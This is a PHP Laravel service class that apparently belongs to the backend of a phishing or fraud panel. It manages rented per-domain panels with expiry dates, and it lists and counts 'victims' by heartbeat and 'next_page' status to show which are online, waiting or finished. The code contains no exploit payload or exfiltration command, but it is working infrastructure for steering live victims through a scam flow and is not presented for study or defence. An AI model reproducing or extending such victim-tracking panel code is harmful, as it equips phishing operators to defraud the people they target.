<?php

namespace Services;

use App\Models\UserPanel;
use Carbon\Carbon;
use Illuminate\Support\Facades\Auth;
use Services\NotificationService;

class UserPanelService
{
  protected $notificationService;

  public function __construct()
  {
    $this->notificationService = new NotificationService();
  }

  public function checkPanelIfExists($userId, $domain)
  {
    $panel = UserPanel::where('domain', $domain)->where('user_id', $userId)->count();
    return $panel;
  }

  public function getVisitors($panelId)
  {
  }

  public function create($input)
  {
    $input['expired_at'] = Carbon::parse($input['expired_at']);
    $panel = UserPanel::create($input);
    return $panel;
  }

  public function get($id)
  {
    $panel = UserPanel::find($id);
    return $panel;
  }

  public function getByDomain($domain)
  {
    $panel = UserPanel::where('domain', $domain)->first();
    return $panel;
  }

  public function getMetadataByDomain($domain)
  {
    $panel = $this->getByDomain($domain);

    $data = [
      ...$panel->toArray(),
      'victims' => $panel->Victims()->orderBy('created_at', 'desc')->get()->map(function ($victim) {
        return [
          ...$victim->toArray(),
          'is_waiting' => $victim->heartbeat >= intval(Carbon::now()->subMinute()->timestamp) && $victim->heartbeat <= intval(Carbon::now()->timestamp)
        ];
      }),
      'meta' => [
        'total_victims' => $panel->Victims()->count(),
        'total_online' => $panel->Victims()->where('next_page', '!=', 'finish')->count(),
        'total_finished' => $panel->Victims()->where('next_page', 'finish')->count(),
        'total_waiting' => $panel->Victims()->whereBetween('heartbeat', [intval(Carbon::now()->subMinute()->timestamp), intval(Carbon::now()->timestamp)])->count()
      ]
    ];

    return $data;
  }

  public function update($id, $input)
  {

    $user = Auth::user();

    if (array_key_exists('expired_at', $input) && $user && $user->role_id == 'admin') {
      $input['expired_at'] = Carbon::parse($input['expired_at']);
      $input['status'] = $input['expired_at'] < Carbon::now() ? 'expired' : $input['status'];
    } else {
      unset($input['expired_at']);
    }

    $panel = UserPanel::find($id);

    if ((Carbon::parse($panel->expired_at) && Carbon::parse($panel->expired_at) < Carbon::now()) && (!$user || $user->role_id !== 'admin')) {
      return $panel;
    }

    if ($panel) {
      $panel->update($input);
    }

    return $panel;
  }

  public function delete($id)
  {
    $panel = UserPanel::find($id);
    if ($panel) {
      $panel->delete();
    }
    return $panel;
  }

  public function delete_many($ids)
  {
    $panels = UserPanel::whereIn('id', $ids)->doesntHave('victims');
    $panels->delete();
    $this->notificationService->create("Some user panels has been removed from the server.", 'pi pi-sitemap', 'red');
    return $panels;
  }
}
